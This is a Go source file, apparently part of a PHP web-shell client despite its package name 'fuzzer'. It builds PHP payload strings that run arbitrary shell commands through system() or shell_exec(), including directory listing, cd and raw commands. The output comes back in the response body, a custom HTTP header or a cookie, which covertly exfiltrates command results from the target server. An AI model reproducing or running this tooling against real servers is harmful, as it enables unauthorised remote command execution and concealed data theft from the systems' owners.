package fuzzer

var CMD = COMMAND{}

type COMMAND struct {
	_method  int
	_context string
}

func (c *COMMAND) SetContext(str string) {
	c._context = str
}

func (c *COMMAND) getSystemCMD(cmd, r string) string {
	return "ob_start();system('" + cmd + "');$" + r + "=ob_get_contents();ob_end_clean();"
}

func (c *COMMAND) getShellExecCMD(cmd, r string) string {
	return "$" + r + "=shell_exec('" + cmd + "');"
}

func (c *COMMAND) createCMD(cmd *string, r string) {
	var contexter string

	if c._context != "" {
		contexter = "cd " + c._context + " && "
	}

	shellCMD := contexter + *cmd

	if c._method == 0 {
		shellCMD = c.getSystemCMD(shellCMD, r)
	} else if c._method == 1 {
		shellCMD = c.getShellExecCMD(shellCMD, r)
	}

	*cmd = shellCMD
}

func (c *COMMAND) getReturn() string {
	var response string

	m := NET.GetMethod()
	p := NET.GetParameter()

	if m == 0 || m == 1 {
		response = "echo(" + PHPEncode("$r") + ");exit();"
	} else if m == 2 {
		response = "header('" + p + ":' . " + PHPEncode("$r") + ");exit();"
	} else if m == 3 {
		response = "setcookie('" + p + "', " + PHPEncode("$r") + ");exit();"
	}

	return response
}

func (cmd *COMMAND) Ls(c string) string {
	var context string

	if c != "" {
		context = "cd " + c + " && "
	}

	lsFolder := context + "ls -ld */"
	lsFile := context + "ls -lp | grep -v /"

	cmd.createCMD(&lsFolder, "a")
	cmd.createCMD(&lsFile, "b")

	ls := lsFolder + lsFile + "$r=json_encode(array($a, $b));" + cmd.getReturn()

	return ls
}

func (cmd *COMMAND) Cd(a string) string {
	cd := a + " && pwd"
	cmd.createCMD(&cd, "r")
	cd = cd + cmd.getReturn()

	return cd
}

func (cmd *COMMAND) Raw(r string) string {
	cmd.createCMD(&r, "r")
	raw := r + cmd.getReturn()

	return raw
}
